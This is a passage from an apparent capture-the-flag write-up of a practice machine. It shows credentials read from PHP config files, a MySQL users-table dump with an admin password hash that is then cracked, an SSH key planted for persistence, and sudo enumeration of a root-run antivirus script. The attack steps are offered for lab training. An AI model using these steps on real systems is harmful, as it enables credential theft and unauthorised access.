+</span></span><span class="line"><span class="cl"><span class="nv">$dev_data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;-1&#39;</span>,<span class="s1">&#39;firstname&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;Developer&#39;</span>,<span class="s1">&#39;lastname&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;username&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;dev_oretnom&#39;</span>,<span class="s1">&#39;password&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;5da283a2***********df5bc0d0&#39;</span>,<span class="s1">&#39;last_login&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;date_updated&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;date_added&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;base_url&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;base_url&#39;</span>,<span class="s1">&#39;http://contacttracer.thm/&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;base_app&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;base_app&#39;</span>, str_replace<span class="o">(</span><span class="s1">&#39;\\&#39;</span>,<span class="s1">&#39;/&#39;</span>,__DIR__<span class="o">)</span>.<span class="s1">&#39;/&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;dev_data&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;dev_data&#39;</span>,<span class="nv">$dev_data</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once<span class="o">(</span><span class="s1">&#39;classes/DBConnection.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once<span class="o">(</span><span class="s1">&#39;classes/SystemSettings.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> new DBConnection<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="nv">$db</span>-&gt;conn<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> redirect<span class="o">(</span><span class="nv">$url</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span>!empty<span class="o">(</span><span class="nv">$url</span><span class="o">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s1">&#39;&lt;script&gt;location.href=&#34;&#39;</span>.base_url .<span class="nv">$url</span>.<span class="s1">&#39;&#34;&lt;/script&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> validate_image<span class="o">(</span><span class="nv">$file</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span>!empty<span class="o">(</span><span class="nv">$file</span><span class="o">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="o">(</span>@getimagesize<span class="o">(</span>base_url.<span class="nv">$file</span><span class="o">)){</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> base_url.<span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> base_url.<span class="s1">&#39;dist/img/no-image-available.png&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> base_url.<span class="s1">&#39;dist/img/no-image-available.png&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span></code></pre></div><p>Cracked it but was not useful since I couldn&rsquo;t switch to any of the two users.</p>
+<p>On further enumeration, <code>/classes</code> directory a file called <code>DBConnection.php</code> had a username &amp; password for accesing mysql database .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@lockdown:/var/www/html/classes$ ls -al
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">52</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> May <span class="m">11</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">11</span> www-data www-data <span class="m">4096</span> May <span class="m">11</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">1770</span> May <span class="m">11</span>  <span class="m">2021</span> City.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data  <span class="m">653</span> May <span class="m">11</span>  <span class="m">2021</span> DBConnection.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">2811</span> May <span class="m">11</span>  <span class="m">2021</span> Establishment.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">1880</span> May <span class="m">11</span>  <span class="m">2021</span> Login.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">1011</span> May <span class="m">11</span>  <span class="m">2021</span> Main.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">2991</span> May <span class="m">11</span>  <span class="m">2021</span> People.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">1788</span> May <span class="m">11</span>  <span class="m">2021</span> State.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">3606</span> May <span class="m">11</span>  <span class="m">2021</span> SystemSettings.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data    <span class="m">4</span> May <span class="m">11</span>  <span class="m">2021</span> TEST.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">2145</span> May <span class="m">11</span>  <span class="m">2021</span> Users.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">1800</span> May <span class="m">11</span>  <span class="m">2021</span> Zone.php
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">lockdown</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">classes</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">DBConnection</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cat</span> <span class="nx">DBConnection</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DBConnection</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;cts&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;YOUMKtIXoR********9tvq2UdNWE&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$database</span> <span class="o">=</span> <span class="s1">&#39;cts_db&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$conn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">host</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">database</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s1">&#39;Cannot connect to database server&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>            
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>    
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Logging into <code>cts_db</code> database to retreive some juicy info .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="o">@</span><span class="n">lockdown</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">classes$</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">cts</span><span class="w"> </span><span class="o">-</span><span class="n">pYOUMKt</span><span class="o">**********</span><span class="mi">9</span><span class="n">tvq2UdNWE</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">cts_db</span><span class="w">       
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">Warning</span><span class="p">]</span><span class="w"> </span><span class="k">Using</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="n">interface</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">insecure</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Reading</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">completion</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="k">names</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">turn</span><span class="w"> </span><span class="k">off</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">feature</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">quicker</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">monitor</span><span class="p">.</span><span class="w">  </span><span class="n">Commands</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="err">\</span><span class="k">g</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Your</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mi">212</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Server</span><span class="w"> </span><span class="k">version</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">35</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">04</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="k">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2000</span><span class="p">,</span><span class="w"> </span><span class="mi">2021</span><span class="p">,</span><span class="w"> </span><span class="n">Oracle</span><span class="w"> </span><span class="k">and</span><span class="o">/</span><span class="k">or</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">affiliates</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Oracle</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">registered</span><span class="w"> </span><span class="n">trademark</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">Oracle</span><span class="w"> </span><span class="n">Corporation</span><span class="w"> </span><span class="k">and</span><span class="o">/</span><span class="k">or</span><span class="w"> </span><span class="n">its</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">affiliates</span><span class="p">.</span><span class="w"> </span><span class="n">Other</span><span class="w"> </span><span class="k">names</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">trademarks</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">respective</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">owners</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Type</span><span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">help</span><span class="p">.</span><span class="w"> </span><span class="k">Type</span><span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">clear</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="k">statement</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">Database</span><span class="w">           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">information_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">cts_db</span><span class="w">             </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">cts_db</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Tables_in_cts_db</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">barangay_list</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">city_list</span><span class="w">        </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">establishment</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">people</span><span class="w">           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">state_list</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">system_info</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">tracks</span><span class="w">           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">users</span><span class="w">            </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">8</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">firstname</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">lastname</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w">                         </span><span class="o">|</span><span class="w"> </span><span class="n">avatar</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">last_login</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">date_added</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">date_updated</span><span class="w">        </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Adminstrator</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mi">3</span><span class="n">eba6f73c19818c36ba8fea761a3ce6d</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">uploads</span><span class="o">/</span><span class="mi">1614302940</span><span class="n">_avatar</span><span class="p">.</span><span class="n">jpg</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">20</span><span class="w"> </span><span class="mi">14</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">37</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">26</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">23</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>I cracked the password hash using crackstation.net .</p>
+<p><img loading="lazy" src="img/crackstation.png#center" alt="crackstation"  />
+</p>
+<p>Now we have the password .Lets  switch to <code>cyrus</code> user.</p>
+<h2 id="usertxt-">user.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#usertxt-">#</a></h2>
+<hr>
+<p>Grab the <code>user.txt</code> flag !</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyrus@lockdown:~$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>w4c1F5Au********Zyp0QJDIbWS<span class="o">}</span>
+</span></span></code></pre></div><h1 id="roottxt-">root.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#roottxt-">#</a></h1>
+<hr>
+<p>To get a stable shell , I uploaded my <code>id_rsa.pub</code> key to <code>authorized_keys</code> so that I could SSH into the machine directly .</p>
+<p>The home directory contained the following  -</p>
+<ul>
+<li>A directory called <code>quarentine</code> which had nothing in it.</li>
+<li>A file called <code>testvirus</code></li>
+</ul>
+<p><code>sudo -l</code> reveals that the user <code>cyrus</code> could run <code>/opt/scan/scan.sh</code> as root !</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyrus@lockdown:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> cyrus: 
+</span></span><span class="line"><span class="cl">Sorry, try again.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> cyrus: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> cyrus on lockdown:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User cyrus may run the following commands on lockdown:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /opt/scan/scan.sh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyrus@lockdown:~$ cat /opt/scan/scan.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> -p <span class="s2">&#34;Enter path: &#34;</span> TARGET
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> -e <span class="s2">&#34;</span><span class="nv">$TARGET</span><span class="s2">&#34;</span> <span class="o">&amp;&amp;</span> -r <span class="s2">&#34;</span><span class="nv">$TARGET</span><span class="s2">&#34;</span> <span class="o">]]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/clamscan <span class="s2">&#34;</span><span class="nv">$TARGET</span><span class="s2">&#34;</span> --copy<span class="o">=</span>/home/cyrus/quarantine
+</span></span><span class="line"><span class="cl">    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid or inaccessible path.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><p>The script is executing a binary called <code>clamscan</code> .Time to google what it is.</p>
+<blockquote>
+<p>Clam AntiVirus (ClamAV) is a free software, cross-platform and open-source antivirus software toolkit able to detect many types of malicious software, including viruses.</p>
+</blockquote>
+<p>So what the script does is it asks us for a path to a file &amp; then it scans it using clamscan (anti-virus) and if the file is malicious ,it copies the file to <code>~/quarentine</code> directory.</p>
+<p>We had a testvirus file remember? Lets give it as i/p to this script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
+</span></span><span class="line"><span class="cl">Enter path: /home/cyrus/testvirus
+</span></span><span class="line"><span class="cl">/home/cyrus/testvirus: EICAR_MD5.UNOFFICIAL FOUND
+</span></span><span class="line"><span class="cl">/home/cyrus/testvirus: copied to <span class="s1">&#39;/home/cyrus/quarantine/testvirus&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
+</span></span><span class="line"><span class="cl">Known viruses: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Engine version: 0.103.2
+</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
